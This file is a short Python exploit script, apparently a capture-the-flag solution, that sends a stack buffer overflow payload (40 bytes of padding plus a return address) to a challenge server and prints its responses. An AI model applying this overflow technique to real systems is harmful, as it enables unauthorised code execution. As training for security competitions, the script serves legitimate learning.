import socket

# Define the host and port of the server you want to connect to
HOST = 'chal.sigpwny.com'
PORT = 1376

# Connect to the server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    
   # Receive feedback from the server
    data = s.recv(1024)
    feedback = data.decode()
    print("Feedback from server: ", feedback)

    # Run your Python code and save the output to a variable
    payload = b"1234567890123456789012345678901234567890"+b"\x5b\x12\x40\x00\x00"
    
    # Send the output to the server
    s.sendall(payload)
	
    ret = "\n"

    s.sendall(ret.encode())

    # Receive feedback from the server
    data = s.recv(1024)
    feedback = data.decode()
    print("Feedback from server: ", feedback)

    # Receive feedback from the server
    data = s.recv(1024)
    feedback = data.decode()
    print("Feedback from server: ", feedback)

